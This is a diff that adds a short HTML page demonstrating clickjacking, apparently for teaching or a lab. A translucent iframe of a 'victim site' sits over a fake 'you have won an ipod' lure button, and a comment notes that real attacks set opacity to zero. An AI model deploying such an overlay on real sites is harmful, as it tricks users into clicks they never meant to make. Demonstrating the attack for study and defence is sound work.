@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<body>
+<style>
+iframe { /* iframe from the victim site */
+  width: 100px;
+  height: 100px;
+  position: absolute;
+  top:0;
+  opacity: 0.5; /* in real opacity:0 */
+  z-index: 1;
+}
+</style>
+
+<div>Congratualations you have won an ipod. Click below to claim it !!!</div>
+<!-- The url from the victim site -->
+<iframe src="clickjacking_victim_site.html"></iframe>
+<button>Click here!</button>
+</body>
+</html>
+
+</body>
+</html>
